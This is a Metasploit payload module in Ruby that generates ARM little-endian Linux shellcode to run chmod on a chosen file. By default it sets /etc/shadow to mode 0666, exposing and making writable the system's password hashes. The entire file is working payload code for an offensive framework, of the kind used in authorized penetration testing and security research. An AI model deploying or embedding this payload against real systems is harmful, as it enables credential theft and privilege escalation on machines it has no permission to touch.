##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 40

  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Chmod',
        'Description' => 'Runs chmod on the specified file with specified mode.',
        'Author' => 'bcoles',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_ARMLE,
        'References' => [
          ['URL', 'https://man7.org/linux/man-pages/man2/chmod.2.html'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/armle/chmod/chmod.s'],
        ]
      )
    )
    register_options([
      OptString.new('FILE', [ true, 'Filename to chmod', '/etc/shadow' ]),
      OptString.new('MODE', [ true, 'File mode (octal)', '0666' ]),
    ])
  end

  # @return [String] the full path of the file to be modified
  def chmod_file_path
    datastore['FILE'] || ''
  end

  # @return [Integer] the desired mode for the file
  def mode
    (datastore['MODE'] || '0666').oct
  rescue StandardError => e
    raise ArgumentError, "Invalid chmod mode '#{datastore['MODE']}': #{e.message}"
  end

  # @return [Integer] ARM LE instruction to load mode into r2 register
  # For example: 0xe30011b6 ; mov r1, #0666 ; loads 0x1b6 (0o666) into r2
  def chmod_instruction(mode)
    0xe3000000 | ((mode & 0xF000) << 4) | (1 << 12) | (mode & 0x0FFF)
  end

  def generate(_opts = {})
    raise ArgumentError, "chmod mode (#{mode}) is greater than maximum mode size (0xFFF)" if mode > 0xFFF

    shellcode = [
      0xe28f0014, # add r0, pc, #20  # pointer to path
      chmod_instruction(mode), # movw r2, <mode>
      0xe3a0700f, # mov r7, #15      # __NR_fchmodat
      0xef000000, # svc 0x00000000   # syscall
      0xe3a00000, # mov	r0, #0       # exit code = 0
      0xe3a07001, # mov r7, #1       # __NR_exit
      0xef000000  # svc 0x00000000   # syscall
    ].pack('V*')
    shellcode += chmod_file_path + "\x00"

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
